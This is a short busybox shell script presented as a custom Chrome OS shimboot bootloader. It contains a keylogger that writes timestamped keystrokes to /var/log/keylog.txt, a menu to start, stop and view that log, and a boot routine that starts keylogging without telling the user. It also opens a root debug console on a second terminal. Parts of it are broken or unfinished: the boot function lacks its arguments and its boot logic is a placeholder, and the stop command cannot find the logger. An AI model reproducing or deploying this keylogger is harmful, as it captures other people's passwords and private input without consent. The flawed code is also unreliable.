#!/bin/busybox sh
# Custom Shimboot for Chrome OS with Keylogging and UI Options

set +x

log_keys() {
  # Function to log keys in the background
  while true; do
    read -n 1 key
    echo "$(date): $key" >> /var/log/keylog.txt
  done &
}

invoke_terminal() {
  local tty="$1"
  local title="$2"
  shift
  shift
  echo "${title}" >>${tty}
  setsid sh -c "exec script -afqc '$*' /dev/null <${tty} >>${tty} 2>&1 &"
}

enable_debug_console() {
  local tty="$1"
  echo -e "debug console enabled on ${tty}"
  invoke_terminal "${tty}" "[Bootstrap Debug Console]" "/bin/busybox sh"
}

show_menu() {
  echo "Select an option:"
  echo "1) Start Keylogging"
  echo "2) Stop Keylogging"
  echo "3) View Keylog"
  echo "4) Boot into Chrome OS"
  echo "5) Exit"
}

handle_selection() {
  case $1 in
    1)
      log_keys
      echo "Keylogging started."
      ;;
    2)
      kill $(pgrep -f "log_keys")  # Stop the keylogging process
      echo "Keylogging stopped."
      ;;
    3)
      cat /var/log/keylog.txt
      ;;
    4)
      boot_chromeos  # Call the boot function
      ;;
    5)
      exit 0
      ;;
    *)
      echo "Invalid selection."
      ;;
  esac
}

boot_chromeos() {
  local target="$1"
  local donor="$2"
  local use_crossystem="$3"
  local invalid_hwid="$4"

  log_keys  # Start logging keys

  echo "mounting target"
  mkdir /newroot
  mount -o ro $target /newroot

  # Continue with the rest of the boot process...
  # (Include the rest of the booting logic here)
}

main() {
  echo "starting the custom shimboot bootloader"
  enable_debug_console "$TTY2"

  while true; do
    show_menu
    read -p "Your selection: " selection
    handle_selection "$selection"
  done
}

trap - EXIT
main "$@"
sleep 1d
